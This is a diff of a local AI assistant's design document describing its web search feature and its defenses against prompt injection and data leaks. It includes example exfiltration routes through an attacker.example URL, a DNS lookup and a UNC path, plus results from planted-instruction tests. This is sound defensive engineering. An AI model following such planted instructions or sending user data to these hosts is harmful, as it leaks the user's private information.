@@ -151,7 +151,10 @@ backend/
       data_key.py            a data key, made once and kept wrapped beside what it
                              encrypts (ADR 0001)
       file_lock.py           the lock two starts at once take turns on
-      sealed.py              files sealed with AES-256-GCM: her voice clips
+      sealed.py              files sealed with AES-256-GCM: her voice clips and
+                             the images attached in chat
+      text_safety.py         text from outside made safe to hand on and honest to
+                             show: what renders as nothing dropped or revealed
       recovery_key.py        the recovery key: written, read back, and the key it
                              derives to seal her data keys
     telemetry/               local diagnostics: black box, performance log, event-loop
@@ -172,12 +175,17 @@ backend/
       embeddings/            multilingual-e5 embedder
       turn/                  smart-turn, the end-of-turn model (CPU, ONNX)
       rerank/                the cross-encoder that reranks document search (CPU, ONNX)
+      web/                   the search providers (SearXNG, Brave) and the page reader:
+                             which addresses may be fetched, bounded decoding, a
+                             linear HTML-to-text tokenizer
     api/                     REST routes and WebSocket endpoints (thin), and the HTTP
                              guards: the CSRF middleware and error handlers
-    kernel/                  capability contract, pipeline, registry, policy,
-                             taint check, confirmation broker, audit log, its hash
-                             chain and its review, argument redaction, records
-    capabilities/            memory, file and app capabilities + path containment
+    kernel/                  capability contract, pipeline, the verdict and its
+                             gates (policy, budget, taint, after the web, egress),
+                             registry, confirmation broker and what a prompt shows,
+                             audit log, its hash chain and its review, argument
+                             redaction, records
+    capabilities/            memory, file, app and web capabilities + path containment
     services/
       voice/                 audio helpers, VAD, voice registry, the voice last
                              chosen, her sealed clips, Voice Studio, push-to-talk
@@ -193,8 +201,10 @@ backend/
                              upgrades (migrations.py), the keyed SQLCipher connector
                              (cipher.py) and the encryption at rest (at_rest.py)
       persona/               the editable personality and the fixed prompt scaffold
+      connected/             the web's settings, live, and the clients that reach it
       recovery.py            her recovery key, made and used across her key files
-      tools/                 a surface's tools: the capabilities it offers the model
+      tools/                 a surface's tools: the capabilities it offers the model,
+                             and what a turn read, by source
   tests/                     pytest suite (deterministic fakes, no GPU needed)
   eval/                      the model evaluations (tools, learning, answers, planted
                              instructions) and document search, with their cases and
@@ -206,7 +216,8 @@ backend/
                              the model and document-search evaluations
 configs/                     default.yaml + hardware profiles
 data/                        runtime data (git-ignored): memory DB, voices, telemetry,
-                             the personality, the policy and attachments
+                             the personality, the policy, the web's settings and
+                             attachments
 frontend/                    React UI + Tauri shell (src-tauri/)
 docs/adr/                    decisions that change the locked stack, proposed or accepted
 CHANGELOG.yaml               patch notes, read by the app and checked by a test
@@ -396,7 +407,7 @@ change live).
 | `app` | `name` Veronica, `env` dev |
 | `gpu` | `vram_budget_gb` 16, in decimal GB (the manager works in GiB: 14.9) |
 | `asr` | `model_size` large-v3-turbo, `device` cuda, `compute_type` float16, `language` auto, beam 1 for partials / 5 for the final, `decode_interval_ms` 400 |
-| `llm` (`config_llm.py`) | `base_url` http://127.0.0.1:11434, `model` qwen3.5:9b (the one model: chat, the live call, learning), `temperature` 0.7, `think` false, `keep_alive` 30m, `num_ctx` 8192 (refused at start below 5,632 tokens beside the longest reply: `MIN_PROMPT_TOKENS`, her longest persona, every tool, memory and documents at their budgets and a message), `num_predict` 2048 (the longest reply, held back from every chat prompt; 2,048 held back when 0 sets no limit), timeouts: connect 5 s / read 120 s / other 60 s |
+| `llm` (`config_llm.py`) | `base_url` http://127.0.0.1:11434, `model` qwen3.5:9b (the one model: chat, the live call, learning), `temperature` 0.7, `think` false, `keep_alive` 30m, `num_ctx` 8192 (refused at start below 5,888 tokens beside the longest reply: `MIN_PROMPT_TOKENS`, her longest persona, every tool with web search on, memory and documents at their budgets and a message; 5,632 before 0.35.0, which left no room for a message once web search was on), `num_predict` 2048 (the longest reply, held back from every chat prompt; 2,048 held back when 0 sets no limit), timeouts: connect 5 s / read 120 s / other 60 s |
 | `tts` | `device` cuda; generation `temperature` 0.8, `repetition_penalty` 1.2, `top_p` 0.95, `top_k` 1000 |
 | `vad` | 16 kHz, `threshold` 0.5, `min_speech_ms` 250, `end_silence_min_ms` 200, `end_silence_max_ms` 800, `recheck_ms` 100, `turn_complete_threshold` 0.6 |
 | `voice` | `voices_dir` (the data folder's `voices`), `active_voice_id` veronica-default (the voice a first start speaks in; the one last chosen is kept beside the voices since 0.34.2) |
@@ -761,9 +772,11 @@ The context window is sent on every request because Ollama's default (4,096 on t
 installation) doesn't refuse a longer prompt: it drops the front, which is the persona
 and the tool rules. `scripts/prompt_probe.py` measures the largest prompt each lane
 sends (`eval/window.py`: memory and documents at their budgets, the whole history
-window, every tool) on the server: 5,306 tokens in chat, 3,258 on a call and 5,235
-for learning at its fullest ([§9.4](#94-conversations-history-and-learning)), with
-qwen3.5:9b at 0.21.5. With the longest reply (2,048) the largest is 7,354, inside 8,192.
+window, every tool, and since 0.35.0 web search on, its rules and tools) on the server:
+5,691 tokens in chat, 3,524 on a call and 5,272 for learning at its fullest
+([§9.4](#94-conversations-history-and-learning)), with qwen3.5:9b at 0.35.0 (without
+the web: 5,467 and 3,380). With the longest reply (2,048) the largest is 7,739, inside
+8,192.
 `tests/test_llm.py` estimates the same prompts from their characters and fails if one
 outgrows the window. Those are ordinary turns; a chat turn with a long message or long
 history is fitted to the window as it is built ([§9.3](#93-what-goes-into-the-prompt)).
@@ -2631,11 +2644,34 @@ not act (test doubles, the harness).
 `CapabilityKernel.execute()` (`kernel/kernel.py`):
 
 ```
-resolve name ──▶ validate args ──▶ policy ──▶ taint ──▶ [preflight, confirm] ──▶ run (with timeout) ──▶ audit ──▶ result
-     │ unknown_capability  │ invalid_args  │ policy_denied  │ (may turn    │ the capability's  │ capability_timeout /
-     ▼                     ▼               ▼                  auto_allow   ▼ own code; confirm_ ▼ capability_failed
-   refused, audited, capability.denied published              into confirm)  denied / _timeout
+resolve name ──▶ validate args ──▶ verdict ──▶ [preflight, confirm] ──▶ count ──▶ run (with timeout) ──▶ audit ──▶ result
+     │ unknown_capability  │ invalid_args  │ refuse or ask │ the capability's    │ budget_  │ capability_timeout /
+     ▼                     ▼               ▼ (below)       ▼ own code; confirm_  ▼ exceeded ▼ capability_failed
+   refused, audited, capability.denied published             denied / _timeout
 ```
+
+**The verdict** (`kernel/verdict.py`, since 0.35.0) is the one decision on a request:
+run it, ask first, or refuse. `execute` acts on it and `requires_confirmation` reports
+it, both from the same `decide()`, so a call that speaks its question before the kernel
+waits (§7.8) can never disagree with what the kernel then does. Before 0.35.0 the two
+were written twice, and the rule for the web was added to one of them. The gates, in
+order, the strictest outcome winning (refuse, then ask, then run):
+
+1. **Available.** A capability switched off since the tool list was built (the web, in
+   Settings) is refused: `network_disabled` or `unavailable`.
+2. **Policy.** `deny` refuses (`policy_denied`); `confirm` asks.
+3. **Budget.** A turn's or a minute's ceiling reached is refused before anyone is asked
+   (`budget_exceeded`, [§12.4](#how-often)).
+4. **Provenance.** An argument copied word for word from what she read asks
+   (`from_reading`, [§12.4](#where-an-argument-came-from-taint)).
+5. **After the web.** In a turn whose prompt holds text from the web, everything that
+   isn't `safe` asks (`after_web`).
+6. **Egress.** A call that reaches the network asks when it would send an address
+   nobody gave her, a secret, or the user's own words (`unfamiliar_link`,
+   `sends_secret`, `sends_private`, [§12.4](#what-leaves-for-the-web)).
+
+The verdict only reads: the budget is counted right before a call runs, so only a call
+that runs is counted, whether unasked or after a yes.
 
 What each ending writes down (the audit row, the perf row, the black box, the bus event)
 is `kernel/records.py`, so the order of the decisions reads in `kernel.py` alone.
@@ -2698,6 +2734,9 @@ class Capability:
     auto_approve: bool = False   # a guarded action that runs unasked by default (§12.4)
     selectors: frozenset[str]    # fields that only pick among her memories (§12.4)
     preflight: Preflight | None  # the check before anyone is asked (§12.2)
+    available: Callable[[], bool] | None  # read at every call: off means refused (§12.2)
+    reach: Reach = "local"       # "network": its arguments go to another host (§12.4)
+    url_fields: frozenset[str]   # the arguments that are addresses, for the egress gate
 
     @property
     def tool_name(self) -> str:  # what the model calls; dots are unreliable in tool names
@@ -2705,8 +2744,16 @@ class Capability:
 ```
 
 Registration fails at startup, not mid-conversation, if a name is taken, if two
-capabilities collapse to the same wire name (`files.read` vs `files_read`), or if the
-arguments model is nested (Pydantic emits `$defs`, which the tool format can't carry).
+capabilities collapse to the same wire name (`files.read` vs `files_read`), if the
+arguments model is nested (Pydantic emits `$defs`, which the tool format can't carry),
+if a `url_fields` entry isn't one of its arguments, or (since 0.35.0) if the name isn't
+a lowercase namespace and one to three dotted parts, at most 200 characters
+(`^[a-z][a-z0-9_]*(\.[A-Za-z0-9_-]+){1,3}$`): a name that will come from elsewhere (an
+MCP server's tool, 0.36.0) can carry nothing else into the tool list.
+
+The model's tool list is built again every round (`ToolBroker.schemas()`, since
+0.35.0): built once a turn, it kept offering the web for the rest of a turn in which
+the web was switched off.
 
 ### 12.4 Policy
 
@@ -2752,7 +2799,9 @@ intent the check can't know.
   one turn is no less a document's the next. In chat that is a cited answer or one
   after a tool call (`ChatSession._read`, rebuilt from the stored rows when a
   conversation reopens); on a call, a reply after a tool call and the opener, which is
-  built from her memory of the last call (`RealtimeSession.carried`). **Trusted** is
+  built from her memory of the last call (`RealtimeSession.carried`). Since 0.35.0 a
+  reply keeps every source it was made from (`frozenset[Source]`, `services/tools/sources.py`):
+  one that read the web and a file is carried as both, where one label lost the web. **Trusted** is
   the user's own messages in the prompt's window, a request they made while a call
   waited on an answer (`Taint.trusting`), and the values a field's type allows
   (`Literal`). Her other replies are neither.
@@ -2787,6 +2836,74 @@ intent the check can't know.
   to `will_confirm` as well as to `execute`.
 - The black box records `capability.from_reading` with the field, the source and the
   length, never the text, which may be the attacker's own sentence.
+
+#### After the web
+
+A page's instruction reworded by the model gets past a word-for-word check. So since
+0.35.0 (ADR 0003) a turn whose prompt holds text from the web makes every action that
+isn't `safe` ask first, whatever the copy check finds. Holds means a search or a page
+read this turn (both join the taint as `web`, not `tool_result`), or an earlier reply
+made from the web still in the window: in chat it is labelled `web` as the turn ends,
+on the stored row's replay too (`lifecycle.label`, `lifecycle.replayed`), and on a call
+by the turn's sources (`RealtimeSession.turn_sources`), on the abort path and when it
+is talked over (`interrupt.py`) as well. The card says "After reading the web"; a call
+says "I read something on the web just before this, so I'm checking with you."
+
+What she read on the web is never learned as the user's: learning skips a reply that
+came after a tool that reads content (`learning_sources.heard`), across the line between
+two parts it reads too (`ends_on_content`: a part can stop between the tool and the
+reply, found in the review of 0.35.0), and a call's recap and
+learning leave out a reply carried as `web` (`session_tasks.own_words`). Before, a
+page's words repeated in her answer could be filed as a fact about the user.
+
+#### What leaves for the web
+
+A capability that reaches the network (`reach="network"`: `web.search`, `web.read`) sends
+its arguments to another host. Both are `safe`, since nothing on this computer changes,
+so without a rule a page could have her read `https://attacker.example/?d=<her memory of
+you>` unasked: the asking is the leak, and the lookup of a host named
+`<memory>.attacker.example` makes it before any page loads. `kernel/egress.py` reads the
+arguments before the handler runs, so before any lookup, and asks:
+
+1. **For an address nobody gave her** (`unfamiliar_link`). A page is read unasked only
+   at an address the user wrote in this conversation or a search returned in it
+   (`Taint.urls`), compared whole (`kernel/urls.py`: scheme and host lowercased, the
+   host as the request resolves it, the default port and the fragment dropped). One
+   the user typed without a scheme ("news.example.org/today") counts as both its http
+   and its https address, not after an "@", so an email address doesn't, and a closing
+   bracket stays with an address that opened one. A file name typed in a message
+   (`main.py`, `notes.md`) becomes a familiar host too, `.py` and `.md` being real
+   top-level domains; harmless, since matching is exact and nothing can be added. A link
+   printed on a page is not familiar: the page's author chose it, and choosing among a
+   page's links is itself a way to signal. This is the rule that keeps data from an
+   attacker's server; the next two back it up.
+2. **For a secret** (`sends_secret`): an argument that reads as a password, a key or a
+   card number (`services/memory/sensitive.py`). It asks rather than refuses: the check
+   reads shapes, and "what is OTP 2FA" reads as one. An address is judged by rule 1
+   alone, here and in rule 3: a familiar one was written by the user or returned by a
+   search, so nothing in it was put there by the model, and a long id in a link passes a
+   card number's checksum about one time in ten (103 of 1,000 status links, in the
+   review of 0.35.0).
+3. **For the user's own words**, best effort (`sends_private`): in a turn whose prompt
+   holds anything she read, an argument that carries four words in a row
+   (`PRIVATE_WORDS`) from her memory of the user, their documents or a local tool's
+   result, words the user didn't say. Fewer words, and a search for "how to make bread"
+   would ask whenever a document says "how to make". Encoded, reversed or translated
+   text gets past it.
+
+The card and a call name the reason ("You didn't give me that address, and no search
+turned it up."). The black box records `capability.egress` with the capability and the
+reason, never an address or a value, which may be the very data being sent.
+
+#### How often
+
+A page can ask her to "read these fifty pages", and every call the model writes runs.
+Since 0.35.0 each capability that reaches the network has a ceiling per turn (4 searches,
+6 pages) and per minute (15 and 30), and every turn a ceiling on all its calls (12)
+(`capabilities.turn_budget`, `minute_budget`, `turn_total`; `kernel/budget.py`). A call
+past one is refused before anyone is asked: "I've done that as many times as I can for
+now, so I stopped there." A turn is the taint's `turn`, minted per turn; the counts of
+the last 64 turns are kept.
 
 `backend/eval/injection` measures this repeatably (`python -m scripts.model_eval
 --families injection`, since 0.30.0): 23 planted instructions, in a cited document
@@ -2837,6 +2954,29 @@ name change, unasked in two runs (none at 0.34.13): acting more readily on a cal
 50, §7.7) reaches it too. Every claim passed on would have been caveated
 ([§12.11](#1211-what-she-passes-on)).
 
+At 0.35.0 the evaluation gained the web (`web_cases.jsonl`, measured apart so the
+numbers above stay comparable): 8 planted instructions and 2 controls in a page she was
+asked to read in chat, or in the snippet of a search she was asked to make on a call,
+the page through the page reader and the snippet through the providers' parser, on the
+prompt and tools a turn has with web search on. The scorer reads the kernel's verdict
+(`CapabilityKernel.verdict`) and records which gate stopped a call (`stopped_by`:
+the policy, what she read, the web, or what it would send). Over three runs chat
+carried out 1 of 8 each time and a call 0, 1 and 1 of 7, every one the file write
+`w02`, which its policy asks about; nothing ran unasked, no claim was passed on and no
+control drew a call. The two that ask her to send what she knows of the user out (`w03`,
+a page read at an address carrying the user's name and home; `w04`, a search for the
+user's child's school) were never attempted, so the egress gate wasn't reached; its
+tests hold it. The one written in tag characters (`w07`) never reached the model. On the
+29 earlier cases chat carried out 1, 1 and 4 of 23: the name change (`r07`) unasked in
+two runs, as at 0.34.14, a file write and a forget that asked, and two claims, both
+caveated; a call 0, 0 and 1 of 12 (a claim, caveated). The persona's web line changed in
+0.35.0 ("except what you look up on the web", where it named only searching): put side
+by side on the web cases, interleaved, three runs each, the two wordings gave the same
+numbers (chat 1 of 8 every run; a call 0, 0 and 1 of 7 with the old, none with the new).
+The tools evaluation, whose prompts are the same bytes as before this release, chose the
+right tool for 43, 42 and 44 of 44 requests in chat and 35, 38 and 34 on a call, none
+wrong and none unasked.
+
 ### 12.5 Confirmation
 
 `ConfirmationBroker` (`kernel/confirm.py`) parks a `confirm`-mode request until someone
@@ -2844,9 +2984,80 @@ answers:
 
 1. mint a single-use token (`secrets.token_urlsafe(16)`) and store a pending entry;
 2. publish `capability.confirm_required` with the capability, its one-line summary, the
-   risk, the actor, a redacted argument preview, the expiry and `why` (`from_reading`
-   when the taint check is what made it ask, otherwise null);
+   risk, the actor, the expiry, `why` (the verdict's reason when one made it ask,
+   otherwise null) and `display`;
 3. wait for `resolve(token, approved, via=…)` or the timeout (45 s).
+
+**What a prompt shows** (`kernel/display.py`, since 0.35.0). A prompt is the one place
+a person checks what an action will do, and its arguments may be an attacker's text.
+Before, the summary cut a page's address at 100 characters, so
+`https://example.org.<…>@attacker.example/` showed as an address on example.org, and
+a bidi override made `Notes_<U+202E>txt.bat` read as `Notes_tab.txt`. Now:
+
+- the summary and every argument show each character that renders as nothing as
+  `⟪U+202E⟫` (`core/text_safety.reveal`);
+- `display.target` names where it lands: the host a page is read from as the request
+  resolves it (`raw_host`: punycode, so a Cyrillic `аpple.com` is `xn--pple-43d.com`),
+  with the Unicode form beside it when it differs, or the file written; `web.read`'s
+  summary is "read a page on <host>", and a long query ends in "…";
+- `display.details` holds each argument cut at 300 characters with the number cut
+  (`more`); the whole of each is fetched on request by the window that shows the prompt
+  (`GET /capabilities/pending/{token}`, `ConfirmationBroker.full`), so a 256 KB file body
+  is no longer sent to every window with the event;
+- what reads as a secret is blanked on the card, found in the whole value and not
+  just the part shown, from where it starts to the end of its line (any line break: a
+  carriage return, a form feed and U+2028 end one too), a private key to its END line
+  (`sensitive.secret_spans`): the patterns find where a secret starts, not where it
+  stops, and a token's ended a character in, a passphrase's after one word, a card
+  number's before the expiry date after it. When its line ends in sixteen of a token's
+  characters, the blank goes on through the lines after it made of nothing else that
+  start with no path or option: a value wrapped over them. Taken from any line, that
+  hid a command on the next one. A wrapped base64 line that happens to start with `/`
+  or `-`, about one in 64, ends it, and the lines after it show. The patterns read the text as a search for a word
+  does (`text_safety.searchable`): what renders as nothing taken out, so a soft hyphen
+  inside "password" no longer hides it, and a Hangul filler read as the space it shows.
+  Each pattern is looked for again from just past where each of its finds starts
+  (`_finds`): a value can run onto the next line and take in the key word there, whose
+  secret, a line further on, showed. The blank says how much it hid
+  (`[redacted: 74 characters]`). A list or an object is screened item by item, its keys
+  and numbers too, each under the name of the field or key holding it; a number stays
+  a number unless it is blanked. A field named for a secret is blanked whole, whatever
+  it holds, its length not shown. A file's path never is, however its name reads:
+  where a script goes is what the card is for, and blanked, `password=x1.ps1` hid it.
+  That holds for the argument itself, not for a key named `path` inside an object. The
+  patterns read shapes: a secret worded, split or encoded unlike any of them is shown;
+- the summary line, which every window is sent and a call says aloud, is the
+  capability's own summary of its arguments blanked first (`display.summarized`), so a
+  summary that cuts a long query cuts the blank, never the start of a secret. A line a
+  check before asking wrote is kept as it is: the file write's names where the file
+  really goes and its size, never its content, and the memory ones refuse a secret
+  before anyone is asked;
+- Show all returns each argument unblanked, but for a field named for a secret:
+  blanked, a secret could hide what an action does, a `$password='x';` in front of a
+  one-line script, so a row with a blank always offers it. The app asks for it only in
+  the window showing the card; the route answers whatever holds the token, which every
+  window is sent with the event, and can reach the API, as every route does (§18)
+  (all found in the reviews of 0.35.0);
+- the line and the card are built off the event loop once the arguments pass 4,096
+  characters (`display.prompt`): on the development machine, 240 ms for the card of a
+  256 KB file body, 440 ms when the line is built from the arguments too, 4 ms for
+  4 KB. Every pattern takes time in proportion to the text, so 256 KB built to slow it
+  (32,000 colons after `rtsp://`, spaces after an Arabic key word, `-eyJ` over and over,
+  nothing but secrets or key headers) took 0.3 to 0.7 s. Before, the stream address,
+  the Arabic and the JWT patterns took minutes on such text, and where a find runs to,
+  looked for from each find, took 5.4 s for 26,000 on one line; a line's end and a
+  key's END line are now looked for once (`_to_line_ends`, `_keys`) (all found in the
+  reviews of 0.35.0).
+
+The card (`shell/PermissionPrompts.tsx`, `shell/PromptDetails.tsx`) shows the summary,
+the reason in a sentence and as a badge, "Hidden characters" when any were marked, an
+international address's real form, and each argument the summary doesn't already show
+whole, with "… N more characters" and Show all. Allow takes no click in its first
+500 ms, so a click on its way when the card appears, or the second half of a double
+click, never lands on it; Don't allow and Escape work at once. A call says the reason
+first and never reads a marked character aloud: it says a space there, never joining
+the words either side, since "pass" and "word" around a hidden line break were said as
+"password" (found in the review of 0.35.0).
 
 It **fails closed** in every direction: a timeout, an unknown or already-used token,
 shutdown, or even failing to publish the prompt all mean "denied". A prompt that
@@ -2860,7 +3071,8 @@ including while the prompt is being published, can't leave a stale prompt behind
 /capabilities/confirm` (`via="ui"`), a spoken answer through the voice session
 (`via="voice"`). It publishes `capability.confirm_resolved`, so answering in one place
 closes the prompt everywhere. `GET /capabilities/pending` lets a surface that reloaded
-mid-confirmation re-render the prompt instead of leaving it stranded until it expires.
+mid-confirmation re-render the prompt instead of leaving it stranded until it expires;
+it carries each prompt's `display`, never the raw arguments.
 
 ### 12.6 The audit log
 
@@ -2988,6 +3200,8 @@ Registered once at startup by `app/capabilities/__init__.py`:
 | `files.search` | safe | yes | find files by name, optionally by content, within a 3 s budget |
 | `files.write` | guarded | yes | write a text file up to 256 KB; refuses to overwrite unless asked, and anything it would refuse is refused before anyone is asked |
 | `apps.open` | guarded | yes | launch an allow-listed application by name |
+| `web.search` | safe, reaches the network | yes | search the web through the provider in Settings: numbered titles, addresses and snippets ([§12.12](#1212-the-web)) |
+| `web.read` | safe, reaches the network | no | read one page as text ([§12.12](#1212-the-web)) |
 
 **Memory** (`capabilities/memory.py`) goes through `MemoryService`, like the Memory page,
 so every write raises the same notification. Until 0.17 the model's memory tools had a
@@ -3062,6 +3276,11 @@ audio. Details worth knowing:
 - **Binary detection** reads an 8 KB probe and uses an incremental UTF-8 decoder, so a
   multi-byte character cut in half at the probe boundary isn't mistaken for binary (a
   plain `decode()` rejected Arabic text about half the time).
+- **What a read hands the model** (since 0.35.0) loses the characters that exist only to
+  hide (`core/text_safety.clean_local`): tag characters, which can spell a whole
+  instruction nobody sees, bidi controls and zero-width spaces. A carriage return or a
+  private-use glyph stays, so a read-then-write edit doesn't change the file. A search's
+  excerpt is cleaned the same way.
 - **Search** checks its deadline per file, not per directory, because a worker thread
   can't be cancelled; one huge folder would otherwise keep reading long after the kernel
   gave up.
@@ -3075,6 +3294,12 @@ audio. Details worth knowing:
   characters to …", or "replace … with 1,204 characters"), and a call still says only
   the file's name. The handler checks it all again when it writes; like every file
   check, it is made when the path is resolved, not at the moment of writing.
+  Since 0.35.0 it never writes a file Windows runs or opens by itself, whatever the
+  answer would be: programs and installers, shortcuts (`.lnk`, `.url`, `.scf`, which
+  Explorer reads as soon as it shows the folder), library and search connectors,
+  `desktop.ini`, `.reg`, `.chm`, `.hta` and the rest of `_SHELL_ACTIVE`. A script
+  (`.ps1`, `.bat`, `.js`, `.py` and others) may be written, and its prompt says "(this
+  file can run as a program)".
 - **`apps.open`** never uses `shell=True` and never calls `os.startfile` on a path (that
   runs whatever the file association says, so a `.bat` in an allowed folder would be code
   execution). Only names in `app_allowlist` launch, with no arguments, and each entry is
@@ -3104,7 +3329,16 @@ capability goes through. In order, it refuses:
    a link out of a root, or her own data, would show in the answer whether a file
    exists there (found in the review of 0.34.1);
 2. network and device paths (`\\server\share`, `\\?\C:`; Python's `resolve()` gives the
-   second form for a name Windows would change inside an existing folder, `notes. `);
+   second form for a name Windows would change inside an existing folder, `notes. `).
+   Since 0.35.0 a path that starts with two slashes of either kind is refused before
+   anything else: resolving `\\attacker\share\x` makes Windows connect to that server
+   and send the account's NetNTLMv2 response, and `files.read` is `safe`, so a page that
+   steered her to read one leaked it with no prompt. So is a name holding a character
+   that renders as nothing (`has_hidden`), which would read as another on the prompt;
+   a joiner inside a word of a script that needs one (Persian, the Indic scripts) and a
+   private-use character (how a Mac shares `:`) are part of a name, not hidden. A name
+   it refuses is never listed or found either, since listings and searches show only
+   what it accepts;
 3. alternate data streams (`file.txt:hidden`, which survives `resolve()`);
 4. reserved device names, including the trailing-dot and trailing-space forms (`CON`,
    `CON.`, `CON ` all reach the same device);
@@ -3191,7 +3425,8 @@ nothing of what is hidden.
 |---|---|
 | `GET /capabilities` | every capability with its description, tier and current mode |
 | `PUT /capabilities/{name}/policy` `{mode}` | change a capability's mode (422 for a dangerous auto-allow) |
-| `GET /capabilities/pending` | confirmations waiting for an answer |
+| `GET /capabilities/pending` | confirmations waiting for an answer, each with its `display` |
+| `GET /capabilities/pending/{token}` | `{token, values}`: every argument of one in full, screened as its prompt is; 404 `confirm_gone` once answered or run out |
 | `POST /capabilities/confirm` `{token, approved}` | answer one (unknown or used tokens are a no-op) |
 | `GET /audit` | the audit log, newest first |
 | `GET /audit/verify` | walk its hash chain: `{ok, rows, unchained, broken_at}` |
@@ -3359,6 +3594,100 @@ before you act on it."
   repeated a turn later, since only the turn's own reading is read. The injection
   evaluation records how many claims passed on it would caveat (`echo_caveated`): all
   three in 0.34.14's runs.
+
+### 12.12 The web
+
+Web search and page reading (ADR 0003; the first version 2026-10-11, rebuilt for 0.35.0).
+Both are off until switched on in Settings > Web, and then searching runs without
+asking, within the rules of [§12.4](#what-leaves-for-the-web).
+
+**Settings** (`services/connected/store.py`): `data/connected.json`, saved atomically,
+with `connected.changed` on every change, so the tools offered, her persona's line about
+the web and every Settings screen follow at once. Web search on or off, the provider
+(a SearXNG instance the user runs, the default, at `http://127.0.0.1:8888`; or Brave's
+API with a key), and hosts never to read. The Brave key is sealed with her data key
+(`core/sealed.py`), never logged, never returned (`GET /connected` says whether one is
+set), and refused when it isn't printable ASCII: it travels in a header, and a
+zero-width space pasted with it failed there with an error that quoted the whole key.
+
+| Route | Purpose |
+|---|---|
+| `GET /connected` · `PUT /connected` | the settings · change them |
+| `PUT /connected/key` `{key \| null}` | set or clear the Brave key; 409 `key_not_kept` where it can't be sealed |
+| `POST /connected/test` | one search through the provider, on or off: `{ok, results}` or `{ok: false, reason}` |
+
+**Searching** (`adapters/web/searxng.py`, `brave.py`, `search.py`): five results by
+default (`capabilities.web_results`), each a title, an address and a snippet. What a
+provider returns is untrusted: markup is stripped with a pattern that can't backtrack,
+each field is cut to 2,000 characters before anything reads it (a provider's 100,000
+`<` took 2.5 s to clean), a result whose address isn't `http(s)` with a host, or is
+longer than 500 characters, is dropped, and everything that renders as nothing is
+removed (`clean_untrusted`). Each address reaches the model as the request would send
+it, percent-encoded (`normalize_url`): a path can carry text in tag characters as a
+snippet can. The addresses returned may be read next without asking.
+
+**Reading a page** (`adapters/web/fetch.py`, `capped.py`, `page_text.py`):
+
+- **Where.** `http` or `https` on its own port (80, 443), no credentials in the address,
+  a host the user hasn't blocked, and every address the host resolves to public
+  (`is_public`): not loopback, private, link-local, multicast or reserved, with the
+  IPv6 forms that wrap one (IPv4-mapped, NAT64, the old site-local block) unwrapped or
+  refused. Nor this computer's own, or one in the /56 around a global IPv6 address of
+  this computer (`Here`): IPv6 has no NAT, so the router and a NAS beside her have
+  global addresses too, and a /56 is what most homes are given. They are read for every
+  hop, off the event loop, never kept for the run: Windows makes a new temporary IPv6
+  address every day (found in the review of 0.35.0). The request goes to the address that was
+  checked, not to the name again (the host's IP in the URL, the name kept for TLS as
+  `sni_hostname` and in `Host`), so a DNS answer that changes between the check and the
+  connection can't slip a private address in. Redirects are checked the same way, three
+  at most, and never from https to http.
+- **How.** Each hop is a client of its own (`client_factory`): no connection kept, no
+  cookie, no proxy from the environment, one TLS context for all. A shared pool reused
+  a connection whose certificate was checked for another site on the same address.
+  The whole read has 25 s.
+- **What.** HTML, XHTML or plain text, read raw and decoded by her: gzip or deflate
+  only, decompressed in bounded steps against the page cap (2 MB, `web_max_page_bytes`),
+  so 97 KB of gzip that unpacks to 100 MB is refused with less than 20 MB used.
+  Brotli, zstd and stacked encodings are refused. A charset is accepted only from a
+  list of text codecs (some, like `punycode`, decode in time that grows with the square
+  of the page).
+- **Into text.** `page_text.readable` is a tokenizer of its own, linear in the page, run
+  on a worker thread and fed at most 524,288 characters: the standard library's parser
+  took 171 ms on 4 KB of `<a ` and 31 s on 40 KB; this one takes 7 ms on 40 KB, and on
+  its whole share 0.11 s for an ordinary page and 0.28 s for the slowest built against
+  it (nothing but `<`). Scripts, styles, `<head>`, navigation, footers, templates,
+  SVG and MathML are dropped; what is left is cleaned with `clean_untrusted`.
+- **Returned** as "title, address, text", fenced like any tool result and cut to the
+  renderer's budget (8,000 characters in chat). A refusal has a code
+  (`host_not_allowed`, `fetch_too_large`, `not_a_page`, `fetch_failed`) and a sentence.
+
+**Untrusted text** (`core/text_safety.py`): `clean_untrusted` drops Unicode tag
+characters, bidi controls, zero-width and other format characters, controls other than a
+tab or a line break, ANSI escapes, private-use and unassigned code points, the Hangul
+fillers, the grapheme joiner, the Khmer inherent vowels and the Mongolian free
+variation selectors (marks that render as nothing, which passed in any number until the
+review of 0.35.0), and a variation selector unless it picks a form of
+the visible character before it as Unicode registers one (`_selects`): text or emoji
+presentation after a symbol beyond ASCII, one of the five emoji that aren't symbols, or
+a keycap's base right before its keycap mark; a math variant after a math symbol beyond
+ASCII; the CJK, Myanmar and Phags-pa variants; the supplement after a CJK ideograph.
+Elsewhere, in a run after an emoji or one per letter, they carry a byte each. One
+selector after a character it can vary still carries a little, up to about a byte after
+an ideograph, which has 240 to choose from: a character's worth per ideograph, never a
+run. It turns
+line and paragraph separators into line breaks. A joiner stays where it does a joiner's
+work: between two letters of a script that needs it (one of them outside ASCII; between
+two Latin letters it only hides) or a zero-width joiner between two symbols (one
+emoji), the first maybe in the emoji form its selector picks; never beside something
+that renders as nothing, since between two dropped selectors a kept joiner carried a
+bit. It is used for pages, search results, document text and titles. `clean_local`
+drops only what exists to hide, for the user's own files: tags, bidi controls,
+zero-width spaces and variation selectors that select nothing. `reveal` shows instead of
+dropping, for prompts and the chat's code and links, and `lib/reveal.ts` does the same
+in the app, by the same rules, for every character both know: Python 3.12's tables are
+Unicode 15.0 and a current browser's 17.0, so a character added since (U+1FAE9, CJK
+Extension I) is marked by the backend and shown by the app. No published file holds such a character as itself: a test fails on one
+(`tests/test_repository.py`), since a reviewer can't see it.
 
 ---
 
@@ -3547,6 +3876,7 @@ What feeds it (`telemetry/hooks.py` and a few call sites):
 | `claims.unsupported` | warn | the claim check, when a reply said she did what no action of the turn did (families and surface, never the reply) |
 | `claims.relayed` | warn | the relay check, when a reply passed on what a line written to her told her to say (the surface, never the reply or what she read) |
 | `capability.from_reading` | info | the kernel, when an argument came word for word from what she read (capability, field, source and length, never the text) |
+| `capability.egress` | info | the kernel, when a call that reaches the network asked because of what it would send (capability and reason, never an address or a value) |
 | `doctor.checked` | info | the check of this computer: each check's code and how long it took (§14.5) |
 | `blackbox.drops` | info | written on close |
 
@@ -3916,6 +4246,14 @@ direction: no build since has written to it, and it is no longer made.
   voice ([§6.3](#63-text-to-speech--chatterboxstreamtts)). A folder or key file she
   can't read or write is `voices_unusable`. Where there is no DPAPI the clips stay
   plain and new ones are written plain.
+- **Attachments are sealed at rest** (since 0.35.0): an image attached in chat is
+  written sealed with the data key, bound to its own file name
+  (`services/chat/attachments.py`), and the plain ones an earlier version left are
